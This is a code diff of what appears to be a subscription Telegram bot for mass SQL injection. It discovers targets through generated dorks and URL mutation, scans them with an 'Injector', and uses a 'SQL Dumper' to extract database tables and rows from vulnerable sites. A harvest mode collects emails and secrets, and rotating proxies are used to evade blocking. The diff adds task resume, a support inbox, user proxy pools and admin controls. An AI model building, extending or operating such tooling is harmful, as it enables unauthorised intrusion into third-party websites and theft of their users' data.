             [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
         ]))
     except Exception:
@@ -9323,10 +9929,13 @@ def inj_resume_clear() -> None:
         pass
 
 
-async def _run_inject(update, context, urls):
+async def _run_inject(update, context, urls, task_id: str = ""):
     """ASLI scan — inj_scan chalao, live bar2 progress, phir sirf vulnerable."""
     cat = context.user_data.get("inj_cat", "all")
     uid = str(update.effective_user.id)
+    #  v2.21.0: task disk pe — bot band ho to on hone par resume
+    tid = task_id or task_new("inj", uid, urls, {"cat": cat},
+                              title="Injector — %s" % CAT_LABEL.get(cat, "ALL"))
     ACTIVE_UID["uid"] = update.effective_user.id
     stop_clear(uid)
     tok = stop_mark(uid)
@@ -9341,21 +9950,32 @@ async def _run_inject(update, context, urls):
     spin = {"n": 0}
     last = {"t": 0.0}
 
+    ck = {"t": 0.0}
+
     async def prog(st):
-        if time.time() - last["t"] < 2.0:
-            return
-        last["t"] = time.time()
-        spin["n"] += 1
-        try:
-            await msg.edit_text(_inj_progress_card(st, spin["n"]),
-                                parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
-        except Exception:
-            pass
+        if time.time() - last["t"] >= 2.0:
+            last["t"] = time.time()
+            spin["n"] += 1
+            try:
+                await msg.edit_text(_inj_progress_card(st, spin["n"]),
+                                    parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
+            except Exception:
+                pass
+        #  CHECKPOINT (30s): bachi hui URLs disk pe — crash/restart ke liye
+        if time.time() - ck["t"] > 30:
+            ck["t"] = time.time()
+            _done = set(st.get("done_urls") or [])
+            task_set_remaining(tid, [u for u in urls if u not in _done])
+            task_update(tid, done=len(_done))
 
     st = await inj_scan(urls, cat, progress=prog, uid=uid,
                         timeout=float(sget("inj_timeout", 6) or 6),
                         conc=int(sget("inj_conc", 40) or 40),
                         max_targets=int(sget("inj_targets", 24) or 24))
+    _left = len([u for u in urls if u not in set(st.get("done_urls") or [])])
+    task_update(tid, done=max(0, len(urls) - _left))
+    task_finish(tid, "done" if not _left else "queued",
+                "" if not _left else "%d URLs bache — /tasks se resume" % _left)
     vulns = st.get("vuln_items") or inj_unique_vulns(st["vulns"])
     took = max(0.001, st.get("took", 0))
     vuln_urls = st.get("vuln_urls") or []
@@ -9655,7 +10275,7 @@ async def cb_parse_deep(update, context):
     return await launch_deep(update, context, dorks)
 
 
-async def input_deep_max(update, context, text: str):
+async def input_deep_max(update, context, text: str, task_id: str = ""):
     """text khaali = auto (jitna mile utna). Number diya to wahi limit."""
     import re as _re
     pf = _take_pending(context, "deep_max", "parse_max")
@@ -9679,6 +10299,10 @@ async def input_deep_max(update, context, text: str):
     ACTIVE_UID["uid"] = _uid
     stop_clear(_uid)
     _tok = stop_mark(_uid)
+    #  v2.21.0: parser bhi task — restart ke baad bachi hui dorks se resume
+    tid = task_id or task_new("parse", _uid, dorks,
+                              {"max": mx, "mode": user_mode(context)},
+                              title="Parser — %d dorks" % len(dorks))
     msg = await reply_msg(update).reply_text(
         (H("DEEP SCAN", "starting") + "\n\n"
          + KV("Dorks", "<code>%s</code>" % fmt(len(dorks)), "🎯") + "\n"
@@ -9721,8 +10345,15 @@ async def input_deep_max(update, context, text: str):
 
     res = await parse_deep(dorks, max_urls=mx, pages=int(sget("parse_pages", 3) or 3),
                            use_proxy=None, progress=prog,
-                           mode=user_mode(context), budget=budget)
+                           mode=user_mode(context), budget=budget, uid=_uid)
     took = time.time() - t0
+    _rest_t = res["stats"].get("remaining_dorks") or []
+    task_update(tid, done=max(0, len(dorks) - len(_rest_t)))
+    task_finish(tid, "done" if not _rest_t else "queued",
+                "" if not _rest_t else "%d dorks bachi — /tasks se resume" % len(_rest_t))
+    if _rest_t and (res["stats"].get("stop") or res["stats"].get("time_up")):
+        #  jo dorks bache unhe task payload me rakh do (resume ke liye)
+        task_set_remaining(tid, _rest_t)
     st = res["stats"]
     urls = res["urls"]
     context.user_data["last_urls"] = urls
@@ -11098,7 +11729,7 @@ async def sqli_dump(urls: list, targets=None, caps=None, timeout: float = 8.0,
     st = {"urls": len(urls), "done": 0, "results": [], "rows": 0, "tables": 0,
           "injectable": 0, "start": time.time(), "stage": "start", "stage_info": "",
           "stopped": 0, "proxy": False}
-    rot = ProxyRotator(enabled=bool(dump_proxy_on() and proxy_available()))
+    rot = ProxyRotator(enabled=bool(dump_proxy_on() and proxy_available()), uid=uid)
     st["proxy"] = rot.enabled
     sem = asyncio.Semaphore(max(1, min(8, conc)))
     lock = asyncio.Lock()
@@ -11221,7 +11852,7 @@ async def dump_harvest(urls: list, progress=None, uid=None, timeout: float = 10.
     urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
     st = {"urls": len(urls), "done": 0, "records": [], "errors": 0,
           "start": time.time(), "stopped": 0, "proxy": False}
-    rot = ProxyRotator(enabled=bool(dump_proxy_on() and proxy_available()))
+    rot = ProxyRotator(enabled=bool(dump_proxy_on() and proxy_available()), uid=uid)
     st["proxy"] = rot.enabled
     sem = asyncio.Semaphore(max(2, min(40, conc)))
     lock = asyncio.Lock()
@@ -11549,12 +12180,15 @@ def _dump_status_line(res: dict) -> str:
         esc(host[:44]), esc((res.get("why") or res.get("status") or "not injectable")[:80]))
 
 
-async def _run_sqldump(update, context, urls, targets=None):
+async def _run_sqldump(update, context, urls, targets=None, task_id: str = ""):
     """ASLI dump — URLs ke andar ka data nikaalo (db → tables → columns → rows)."""
     uid = str(update.effective_user.id)
     stop_clear(uid)
     tok = stop_mark(uid)
     urls = _uniq([u for u in urls if str(u).startswith("http")])
+    tid = task_id or task_new("dump", uid, urls,
+                              {"targets": dict(targets or {})},
+                              title="SQL Dumper — %d URLs" % len(urls))
     caps = _sqli_caps()
     msg = await reply_msg(update).reply_text(
         _dump_progress_card({"urls": len(urls), "done": 0, "results": [], "rows": 0,
@@ -11563,6 +12197,8 @@ async def _run_sqldump(update, context, urls, targets=None):
         parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
     spin = {"n": 0}
 
+    ck = {"t": 0.0}
+
     async def prog(st):
         spin["n"] += 1
         try:
@@ -11570,10 +12206,20 @@ async def _run_sqldump(update, context, urls, targets=None):
                                 parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
         except Exception:
             pass
+        if time.time() - ck["t"] > 30:
+            ck["t"] = time.time()
+            _done = {r.get("url") for r in (st.get("results") or [])}
+            task_set_remaining(tid, [u for u in urls if u not in _done])
+            task_update(tid, done=len(_done))
 
     st = await sqli_dump(urls, targets=targets, caps=caps,
                          timeout=float(sget("dump_timeout", 8) or 8),
                          conc=int(sget("dump_conc", 3) or 3), progress=prog, uid=uid)
+    _done_u = {r.get("url") for r in (st.get("results") or [])}
+    _left_u = [u for u in urls if u not in _done_u]
+    task_update(tid, done=len(_done_u))
+    task_finish(tid, "done" if not _left_u else "queued",
+                "" if not _left_u else "%d URLs bache — /tasks se resume" % len(_left_u))
     saved = sqli_save(st)
     results = st["results"]
     okn = st["injectable"]
@@ -11644,12 +12290,13 @@ async def _run_sqldump(update, context, urls, targets=None):
     await_clear(context)
 
 
-async def _run_dump(update, context, urls):
+async def _run_dump(update, context, urls, task_id: str = ""):
     """Page harvest (forms/links/emails/secrets) — purana dumper."""
     uid = str(update.effective_user.id)
     stop_clear(uid)
     tok = stop_mark(uid)
     urls = _uniq([u for u in urls if str(u).startswith("http")])
+    tid = task_id or task_new("harvest", uid, urls, {}, title="Harvest — %d URLs" % len(urls))
     msg = await reply_msg(update).reply_text(
         _dump_progress_card({"urls": len(urls), "done": 0, "records": [], "errors": 0,
                              "start": time.time()}, 0),
@@ -11696,6 +12343,8 @@ async def _run_dump(update, context, urls):
         await send_file(update, f, "📄 " + os.path.basename(f))
     if st.get("zip"):
         await send_file(update, st["zip"], "📦 all page reports + summary")
+    task_update(tid, done=len(recs))
+    task_finish(tid, "done")
     await_clear(context)
 
 
@@ -13113,6 +13762,794 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Or pick a tool:",
         parse_mode=ParseMode.HTML, reply_markup=kb_main())
 
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  📨 INBOX + ☎️ SUPPORT (v2.21.0) — user seedha owner ko message kare
+# ═══════════════════════════════════════════════════════════════════════════════
+INBOX_MAX = 40
+
+
+def inbox_all() -> dict:
+    d = jload("inbox", {}) or {}
+    return d if isinstance(d, dict) else {}
+
+
+def inbox_add(uid, who: str, text: str) -> None:
+    d = inbox_all()
+    key = str(uid)
+    rec = list(d.get(key) or [])
+    rec.append({"ts": datetime.now().isoformat(timespec="seconds"),
+                "who": who, "text": str(text or "")[:1500]})
+    d[key] = rec[-INBOX_MAX:]
+    jsave("inbox", d)
+
+
+def inbox_get(uid, n: int = 10) -> list:
+    return list((inbox_all().get(str(uid)) or []))[-max(1, int(n)):]
+
+
+def support_text(uid) -> str:
+    return (H("SUPPORT", "direct line to the owner") + "\n\n"
+            + KV("Owner", "<b>%s</b>" % esc(ADMIN_USERNAME), "👑") + "\n"
+            + KV("Reply time", "usually within a few hours", "⏱") + "\n\n"
+            + P("Koi bhi problem ho — task atka, key ka issue, error, ya suggestion — "
+                "seedha message bhejo. Owner ko yahi message jayega aur reply bhi yahin milega.")
+            + "\n\n" + P("🕘 Aapke pichle messages bhi isi screen se dekh sakte ho."))
+
+
+def support_kb(uid) -> InlineKeyboardMarkup:
+    rows = [[InlineKeyboardButton("✍️ WRITE MESSAGE", callback_data="m:support_write")]]
+    if inbox_get(uid, 1):
+        rows.append([InlineKeyboardButton("🕘 MY MESSAGES", callback_data="m:support_hist")])
+    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
+    return RK(rows)
+
+
+async def tool_support(update, context):
+    uid = update.effective_user.id
+    txt = support_text(uid)
+    try:
+        await update.callback_query.edit_message_text(
+            txt, parse_mode=ParseMode.HTML, reply_markup=support_kb(uid))
+    except Exception:
+        pass
+
+
+async def cb_support_write(update, context):
+    q = update.callback_query
+    try:
+        await q.edit_message_text(
+            (H("SUPPORT", "write to the owner") + "\n\n"
+             + P("Apna message likho — next message seedha owner ko jayega.")
+             + "\n\n" + KV("Owner", "<b>%s</b>" % esc(ADMIN_USERNAME), "👑")),
+            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:support"))
+    except Exception:
+        pass
+    await_set(context, "support_msg")
+
+
+async def cb_support_hist(update, context):
+    uid = update.effective_user.id
+    rec = inbox_get(uid, 12)
+    lines = []
+    for r in rec:
+        icon = "🙋" if r.get("who") == "user" else "👑"
+        lines.append("%s <i>%s</i>\n%s" % (icon, esc((r.get("ts") or "")[5:16]),
+                                           esc(r.get("text") or "")[:300]))
+    body = (H("MY MESSAGES", "%d recent" % len(rec)) + "\n\n"
+            + ("\n\n".join(lines) if lines else P("Koi message nahi.")))
+    try:
+        await update.callback_query.edit_message_text(
+            body, parse_mode=ParseMode.HTML, reply_markup=support_kb(uid))
+    except Exception:
+        pass
+
+
+async def input_support(update, context, text: str):
+    uid = update.effective_user.id
+    text = str(text or "").strip()[:1500]
+    if not text:
+        await reply_msg(update).reply_text("❌ Khaali message — kuch likho.",
+                                           reply_markup=kb_back("m:support"))
+        await_set(context, "support_msg")
+        return
+    inbox_add(uid, "user", text)
+    uname = getattr(update.effective_user, "username", "") or ""
+    app = BOT_REF.get("app")
+    sent = 0
+    if app:
+        body = ("📨 <b>SUPPORT MESSAGE</b>\n\n"
+                "👤 <b>%s</b> · <code>%s</code>%s\n\n%s\n\n"
+                "<i>Reply: /admin → USERS → is user ka card → ✉️ MSG</i>"
+                % (esc(getattr(update.effective_user, "first_name", "user")), uid,
+                   (" · @" + uname) if uname else "", esc(text)))
+        for adm in ADMIN_IDS:
+            try:
+                await app.bot.send_message(chat_id=int(adm), text=body,
+                                           parse_mode=ParseMode.HTML)
+                sent += 1
+            except Exception:
+                pass
+    await reply_msg(update).reply_text(
+        (H("MESSAGE SENT", "owner ko pahunch gaya" if sent else "saved") + "\n\n"
+         + KV("Owner", "<b>%s</b>" % esc(ADMIN_USERNAME), "👑") + "\n"
+         + KV("Delivered", "<code>%s</code> admin(s)" % sent, "📨") + "\n\n"
+         + P("Reply aayega yahin — 🕘 MY MESSAGES se purane messages dekh sakte ho.")),
+        parse_mode=ParseMode.HTML, reply_markup=support_kb(uid))
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  🌐 MY PROXY (v2.21.0) — user apna rotating proxy khud lagaye
+# ═══════════════════════════════════════════════════════════════════════════════
+def user_proxy_cfg(uid) -> dict:
+    rec = USERS.get(str(uid)) or {}
+    cfg = rec.get("proxy") or {}
+    return cfg if isinstance(cfg, dict) else {}
+
+
+def user_proxy_pool(uid) -> list:
+    cfg = user_proxy_cfg(uid)
+    return [str(u) for u in (cfg.get("pool") or []) if str(u).startswith("http")]
+
+
+def user_proxy_on(uid) -> bool:
+    return bool(user_proxy_cfg(uid).get("on"))
+
+
+def user_proxy_url(uid) -> str:
+    pool = user_proxy_pool(uid)
+    if not pool or not user_proxy_on(uid):
+        return ""
+    return random.choice(pool)
+
+
+def user_proxy_set(uid, pool) -> int:
+    rec = USERS.setdefault(str(uid), {})
+    cfg = rec.get("proxy") or {}
+    # har line parse karo — host:port / host:port:user:pass / url, sab chale
+    norm = []
+    for u in (pool or []):
+        u = str(u).strip()
+        if not u:
+            continue
+        norm.append(u if u.startswith("http") else (_parse_proxy_line(u) or ""))
+    pool = _uniq([u for u in norm if u.startswith("http")])[:20]
+    cfg["pool"] = pool
+    cfg["on"] = 1 if pool else 0
+    cfg["ts"] = datetime.now().isoformat(timespec="seconds")
+    rec["proxy"] = cfg
+    USERS[str(uid)] = rec
+    jsave("users", USERS)
+    return len(pool)
+
+
+def _parse_proxy_line(line: str) -> str:
+    """host:port:user:pass → http://user:pass@host:port"""
+    raw = str(line or "").strip()
+    if not raw:
+        return ""
+    if "://" in raw:
+        return raw
+    parts = raw.split(":")
+    if len(parts) == 2 and parts[1].isdigit():
+        return "http://%s:%s" % (parts[0], parts[1])
+    if len(parts) == 4 and parts[1].isdigit():
+        return "http://%s:%s@%s:%s" % (parts[2], parts[3], parts[0], parts[1])
+    if len(parts) == 4 and parts[3].isdigit():
+        return "http://%s:%s@%s:%s" % (parts[0], parts[1], parts[2], parts[3])
+    return ""
+
+
+def _mask_pw(u: str) -> str:
+    return re.sub(r"(://[^:@/]+:)[^@/]+@", r"\1•••@", str(u))
+
+
+async def user_proxy_test(url: str, timeout: float = 9.0) -> tuple:
+    """(ok, ip_or_error) — proxy se asli request."""
+    try:
+        pxc, _h, _ip, _s = await proxy_connect_url(url)
+        conn = mk_connector(limit=4, force_close=True)
+        async with aiohttp.ClientSession(connector=conn) as sess:
+            async with sess.get("http://api.ipify.org", proxy=pxc, ssl=False,
+                                timeout=aiohttp.ClientTimeout(total=timeout)) as r:
+                body = (await r.text())[:60].strip()
+                if r.status == 200 and body:
+                    return True, body
+                return False, "HTTP %s" % r.status
+    except Exception as exc:
+        return False, str(exc)[:90]
+
+
+def myproxy_card(uid) -> str:
+    cfg = user_proxy_cfg(uid)
+    pool = user_proxy_pool(uid)
+    onn = bool(cfg.get("on")) and bool(pool)
+    return (H("MY PROXY", "%d in pool" % len(pool)) + "\n\n"
+            + KV("Status", "✅ ON" if onn else ("⚪ OFF" if pool else "⚪ not set"), "🎛") + "\n"
+            + KV("Proxies", "<code>%d</code> saved (max 20)" % len(pool), "🧅") + "\n"
+            + ("\n" + B("Your proxies") + "\n"
+               + "\n".join("• <code>%s</code>" % esc(_mask_pw(u)) for u in pool[:6])
+               + (("\n<i>+ %d more…</i>" % (len(pool) - 6)) if len(pool) > 6 else "")
+               if pool else "")
+            + "\n\n" + P("Format: <code>host:port:user:pass</code> (ya comma/newline se "
+                         "kai proxies). Rotating proxy best — har request naya IP.")
+            + "\n" + P("⚠️ Proxy ON karne se speed thodi kam hoti hai, par block kam."))
+
+
+def myproxy_kb(uid) -> InlineKeyboardMarkup:
+    pool = user_proxy_pool(uid)
+    rows = [[InlineKeyboardButton("➕ ADD PROXY", callback_data="upx:add")]]
+    if pool:
+        onn = user_proxy_on(uid)
+        rows.append([InlineKeyboardButton(("🔴 TURN OFF" if onn else "🟢 TURN ON"),
+                                          callback_data="upx:toggle")])
+        rows.append([InlineKeyboardButton("🧪 TEST", callback_data="upx:test"),
+                     InlineKeyboardButton("🗑 CLEAR ALL", callback_data="upx:clear")])
+    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
+    return RK(rows)
+
+
+async def tool_myproxy(update, context):
+    uid = update.effective_user.id
+    try:
+        await update.callback_query.edit_message_text(
+            myproxy_card(uid), parse_mode=ParseMode.HTML, reply_markup=myproxy_kb(uid))
+    except Exception:
+        pass
+
+
+async def input_myproxy(update, context, text: str):
+    uid = update.effective_user.id
+    lines = [x.strip() for x in re.split(r"[\n,;]+", str(text or "")) if x.strip()]
+    good, bad = [], []
+    for ln in lines:
+        pu = _parse_proxy_line(ln)
+        (good if pu else bad).append(pu or ln)
+    if not good:
+        await reply_msg(update).reply_text(
+            "❌ Proxy samajh nahi aaya.\n\n"
+            "Sahi format:\n<code>host:port:user:pass</code>\n"
+            "<code>host:port</code>\n<code>http://user:pass@host:port</code>",
+            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:myproxy"))
+        await_set(context, "myproxy")
+        return
+    pool = user_proxy_pool(uid) + good
+    n = user_proxy_set(uid, pool)
+    await reply_msg(update).reply_text(
+        (H("MY PROXY", "%d saved" % n) + "\n\n"
+         + "✅ added: <code>%d</code>\n" % len(good)
+         + (("⚠️ skipped: <code>%d</code>\n" % len(bad)) if bad else "")
+         + "\n" + "\n".join("• <code>%s</code>" % esc(_mask_pw(u)) for u in good[:5])
+         + "\n\n" + P("Ab TEST dabao — proxy zinda hai ya nahi.")),
+        parse_mode=ParseMode.HTML, reply_markup=myproxy_kb(uid))
+
+
+async def cb_myproxy(update, context, act: str):
+    uid = update.effective_user.id
+    q = update.callback_query
+    if act == "add":
+        try:
+            await q.edit_message_text(
+                (H("MY PROXY", "add") + "\n\n"
+                 + P("Ek line me proxy bhejo (kai ho to comma/newline se):") + "\n\n"
+                 + "<code>host:port:user:pass</code>\n"
+                 + "<code>http://user:pass@host:port</code>\n\n"
+                 + P("Rotating proxy (jaise webshare/smartproxy) ka endpoint best hai.")),
+                parse_mode=ParseMode.HTML, reply_markup=kb_back("m:myproxy"))
+        except Exception:
+            pass
+        await_set(context, "myproxy")
+        return
+    if act == "toggle":
+        rec = USERS.setdefault(str(uid), {})
+        cfg = rec.get("proxy") or {}
+        cfg["on"] = 0 if cfg.get("on") else 1
+        rec["proxy"] = cfg
+        jsave("users", USERS)
+        try:
+            await q.answer("✅ ON" if cfg["on"] else "⚪ OFF")
+        except Exception:
+            pass
+    elif act == "clear":
+        user_proxy_set(uid, [])
+        try:
+            await q.answer("🗑 cleared")
+        except Exception:
+            pass
+    elif act == "test":
+        pool = user_proxy_pool(uid)
+        if not pool:
+            try:
+                await q.answer("Pehle proxy add karo", show_alert=True)
+            except Exception:
+                pass
+            return
+        try:
+            await q.answer("🧪 testing…")
+        except Exception:
+            pass
+        okk, w = await user_proxy_test(pool[0])
+        await reply_msg(update).reply_text(
+            ("✅ <b>Proxy working</b>\nIP: <code>%s</code>" % esc(w))
+            if okk else ("❌ <b>Proxy fail</b>\n<code>%s</code>" % esc(w)),
+            parse_mode=ParseMode.HTML)
+    try:
+        await q.edit_message_text(myproxy_card(uid), parse_mode=ParseMode.HTML,
+                                  reply_markup=myproxy_kb(uid))
+    except Exception:
+        pass
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  ♻️ EXPAND (v2.21.0) — same quality ka MORE: KW→KW · DORK→DORK · URL→URL
+# ═══════════════════════════════════════════════════════════════════════════════
+_SITE_RE = re.compile(r"\bsite:[^\s]+", re.I)
+_INURL_RE = re.compile(r"\binurl:[^\s]+", re.I)
+_EXT_RE = re.compile(r"\b(?:filetype|ext):[^\s]+", re.I)
+_OP_RE = re.compile(r"\b(?:inurl|intitle|intext|allinurl|allintitle|allintext|site|"
+                    r"filetype|ext|inanchor)\s*:", re.I)
+
+
+def expand_keywords(seeds, n: int = 500) -> list:
+    """Same seeds se usi quality ke NAYE keywords (purane nahi)."""
+    seeds = _uniq([str(x).strip() for x in (seeds or []) if str(x).strip()])
+    if not seeds:
+        return []
+    have = set(seeds) | {s.lower() for s in seeds}
+    return make_keywords(seeds, n=max(1, int(n)), exclude=have)[:max(1, int(n))]
+
+
+def _dork_parts(dorks) -> dict:
+    """Dorks se shape nikalo — sites / inurls / filetypes / keywords."""
+    sites, inurls, exts, kws = [], [], [], []
+    for d in dorks or []:
+        d = str(d)
+        sites += _SITE_RE.findall(d)
+        inurls += _INURL_RE.findall(d)
+        exts += _EXT_RE.findall(d)
+        clean = _OP_RE.sub(" ", d)
+        clean = re.sub(r'["\'()+\-]', " ", clean)
+        kws += kw_cores([clean])
+    return {"sites": _uniq(sites)[:8], "inurls": _uniq(inurls)[:8],
+            "exts": _uniq(exts)[:6], "kws": _uniq(kws)[:40]}
+
+
+def expand_dorks(dorks, n: int = 500, fresh: bool = True) -> list:
+    """Same shape (site/inurl/filetype) ke naye dorks — quality same rehti hai."""
+    src = _uniq([str(d).strip() for d in (dorks or []) if str(d).strip()])
+    if not src:
+        return []
+    parts = _dork_parts(src)
+    kws = parts["kws"] or ["admin"]
+    pool = universal_gen(kws, n=max(int(n) * 2, 200), fresh=fresh)
+    if not pool:
+        return []
+    rnd = random.Random(int(time.time() * 1000) % 99991)
+    out, seen = [], set(src)
+    for d in pool:
+        d = str(d).strip()
+        if parts["sites"] and "site:" not in d.lower():
+            d = "%s %s" % (d, rnd.choice(parts["sites"]))
+        if parts["inurls"] and "inurl:" not in d.lower():
+            d = "%s %s" % (rnd.choice(parts["inurls"]), d)
+        if parts["exts"] and not _EXT_RE.search(d) and len(out) % 4 == 0:
+            d = "%s %s" % (d, rnd.choice(parts["exts"]))
+        d = " ".join(d.split())[:300]
+        if d and d not in seen:
+            seen.add(d)
+            out.append(d)
+        if len(out) >= int(n):
+            break
+    return out
+
+
+URL_EXPAND_PARAMS = ("id", "page", "cat", "product", "item", "file", "url", "view",
+                     "search", "q", "type", "lang", "pid", "name", "dir")
+
+
+def expand_urls(urls, n: int = 1000) -> list:
+    """Usi host/path shape ke naye URLs — params, pages, file types."""
+    src = _uniq([str(u).strip() for u in (urls or []) if str(u).startswith("http")])
+    if not src:
+        return []
+    out, seen = [], set(src)
+    rnd = random.Random(int(time.time() * 1000) % 99991)
+
+    def add(u):
+        if u and u not in seen and len(out) < int(n):
+            seen.add(u)
+            out.append(u)
+
+    for raw in src:
+        try:
+            p = urlparse(raw)
+            host = p.hostname or ""
+            if not host:
+                continue
+            q = dict(parse_qsl(p.query, keep_blank_values=True))
+            path = p.path or "/"
+            # 1) same param, naye values
+            for k, v in q.items():
+                for nv in ("1", "2", "3", "10", "50", "100", "admin", "test", "0",
+                           "index", "home", "about"):
+                    nq = dict(q)
+                    nq[k] = nv
+                    add(urlunparse(p._replace(query=urlencode(nq))))
+            # 2) naye common params
+            for k in rnd.sample(URL_EXPAND_PARAMS, 6):
+                nq = dict(q)
+                nq.setdefault(k, str(rnd.randint(1, 500)))
+                add(urlunparse(p._replace(query=urlencode(nq))))
+            # 3) path variants
+            base = path.rsplit("/", 1)[0] + "/"
+            for f in ("index", "admin", "login", "search", "upload", "api", "backup"):
+                add(urlunparse(p._replace(path=base + f + ".php", query=urlencode(q))))
+                add("https://%s/%s/" % (host, f))
+            # 4) www / non-www
+            if host.startswith("www."):
+                add(urlunparse(p._replace(netloc=p.netloc.replace("www.", "", 1))))
+            else:
+                add(urlunparse(p._replace(netloc="www." + p.netloc)))
+        except Exception:
+            continue
+    return out[:int(n)]
+
+
+def expand_text(context) -> str:
+    ud = getattr(context, "user_data", {}) or {}
+    return (H("EXPAND", "same quality — more of the same") + "\n\n"
+            + KV("Keywords", "<code>%s</code> ready" % fmt(len(ud.get("last_kw_items") or [])), "🔑") + "\n"
+            + KV("Dorks", "<code>%s</code> ready" % fmt(len(ud.get("last_dorks") or [])), "🎯") + "\n"
+            + KV("URLs", "<code>%s</code> ready" % fmt(len(ud.get("last_urls") or [])), "🌐") + "\n\n"
+            + P("Jo pehle bana hai usi ki quality rakhte hue NAYE items banao — "
+                "purane repeat nahi honge."))
+
+
+def expand_kb(context=None) -> InlineKeyboardMarkup:
+    ud = getattr(context, "user_data", {}) or {}
+    rows = [
+        [InlineKeyboardButton("🔑 KEYWORDS → %s NEW" % fmt(len(ud.get("last_kw_items") or []) or 500),
+                              callback_data="ex:kw")],
+        [InlineKeyboardButton("🎯 DORKS → NEW", callback_data="ex:dork")],
+        [InlineKeyboardButton("🌐 URLS → NEW", callback_data="ex:url")],
+        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
+    ]
+    return RK(rows)
+
+
+async def tool_expand(update, context):
+    try:
+        await update.callback_query.edit_message_text(
+            expand_text(context), parse_mode=ParseMode.HTML, reply_markup=expand_kb(context))
+    except Exception:
+        pass
+
+
+async def cb_expand(update, context, what: str):
+    """Pehle bane items se naye banao (same quality)."""
+    ud = context.user_data
+    q = update.callback_query
+    base = {"kw": (ud.get("last_kw_items") or ud.get("last_kws") or []),
+            "dork": (ud.get("last_dorks") or []),
+            "url": (ud.get("last_urls") or [])}.get(what) or []
+    if not base:
+        try:
+            await q.answer("Pehle %s banao — phir EXPAND" % {"kw": "keywords", "dork": "dorks",
+                                                             "url": "URLs"}[what],
+                           show_alert=True)
+        except Exception:
+            pass
+        return
+    try:
+        await q.answer("♻️ expanding…")
+    except Exception:
+        pass
+    n = max(100, min(DORK_MAX, len(base) * 3))
+    if what == "kw":
+        items = expand_keywords(base, n)
+        tag, label = "expand_kw", "🔑 %d new keywords"
+        ud["last_kw_items"] = _uniq(base + items)
+        path, cnt = dump_text(items, tag, "PYTHON SNAKE — expanded keywords")
+    elif what == "dork":
+        items = expand_dorks(base, n, fresh=True)
+        tag, label = "expand_dork", "🎯 %d new dorks"
+        ud["last_dorks"] = _uniq(base + items)
+        path, cnt = dump_text(items, tag, "PYTHON SNAKE — expanded dorks")
+    else:
+        items = expand_urls(base, n)
+        tag, label = "expand_url", "🌐 %d new URLs"
+        ud["last_urls"] = _uniq(base + items)
+        path, cnt = dump_text(items, tag, "PYTHON SNAKE — expanded URLs")
+    if not items:
+        try:
+            await q.edit_message_text(
+                "❌ Kuch naya nahi bana — thoda alag input try karo.",
+                reply_markup=expand_kb(context))
+        except Exception:
+            pass
+        return
+    rows = [[InlineKeyboardButton("♻️ EXPAND AGAIN", callback_data="ex:" + what)]]
+    if what == "kw":
+        rows.insert(0, [InlineKeyboardButton("🎯 MAKE DORKS", callback_data="dd:gen")])
+    elif what == "dork":
+        rows.insert(0, [InlineKeyboardButton("🚀 DEEP SCAN", callback_data="pr:deep")])
+    else:
+        rows.insert(0, [InlineKeyboardButton("💉 INJECTOR", callback_data="inj:go")])
+    rows.append([InlineKeyboardButton("⬅️ EXPAND", callback_data="m:expand")])
+    try:
+        await q.edit_message_text(
+            (H("EXPANDED", label % cnt) + "\n\n"
+             + KV("Source", "<code>%s</code>" % fmt(len(base)), "📥") + "\n"
+             + KV("New", "<code>%s</code>" % fmt(cnt), "✨") + "\n"
+             + KV("Total now", "<code>%s</code>" % fmt(len(base) + cnt), "📚") + "\n\n"
+             + B("Top 5") + "\n" + short_list(items[:5], 5)),
+            parse_mode=ParseMode.HTML, reply_markup=RK(rows))
+    except Exception:
+        pass
+    await send_file(update, path, label % cnt)
+
+
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  👑 ADMIN — USER MANAGER (v2.21.0)
+#  Kisi bhi user ka poora data, ban/unban, subscription +/-, DM, inbox.
+# ═══════════════════════════════════════════════════════════════════════════════
+def _u_rec(uid) -> dict:
+    return USERS.get(str(uid)) or {}
+
+
+def _u_exp_text(uid) -> str:
+    exp = _u_rec(uid).get("expires")
+    if not exp:
+        return "⚪ no subscription"
+    try:
+        dt = datetime.fromisoformat(exp)
+        left = (dt - datetime.now()).days
+        return "%s (%+d days)" % (dt.strftime("%d %b %Y"), left)
+    except Exception:
+        return str(exp)
+
+
+def admin_user_card(uid) -> str:
+    rec = _u_rec(uid)
+    if not rec:
+        return H("USER", str(uid)) + "\n\n" + P("Ye user record nahi mila.")
+    keys_used = [k for k, v in KEYS.items() if str(v.get("used_by")) == str(uid)]
+    tks = tasks_of(uid)
+    act = [t for t in tks if t.get("status") in ("running", "queued")]
+    cfg = rec.get("proxy") or {}
+    msgs = inbox_get(uid, 3)
+    return (H("USER", str(uid)) + "\n\n"
+            + KV("Name", "<b>%s</b>" % esc(rec.get("name") or "?"), "👤") + "\n"
+            + KV("Joined", "<code>%s</code>" % esc((rec.get("joined") or "—")[:16]), "📅") + "\n"
+            + KV("Last seen", "<code>%s</code>" % esc((rec.get("last") or "—")[:16]), "👀") + "\n"
+            + KV("Subscription", _u_exp_text(uid), "💎") + "\n"
+            + KV("Status", "🚫 BANNED" if rec.get("banned") else "✅ active", "🚦") + "\n"
+            + KV("Keys used", "<code>%s</code>" % (", ".join(keys_used[:3]) or "none"), "🔑") + "\n"
+            + KV("Tasks", "<code>%d</code> (active <b>%d</b>)" % (len(tks), len(act)), "🗂") + "\n"
+            + KV("Own proxy", ("✅ %d saved" % len(cfg.get("pool") or [])) if cfg.get("pool")
+               else "⚪ not set", "🧅") + "\n"
+            + KV("Support msgs", "<code>%s</code>" % len(inbox_get(uid, 40)), "📨")
+            + (("\n\n" + B("Last messages") + "\n"
+                + "\n".join("%s %s" % ("🙋" if m.get("who") == "user" else "👑",
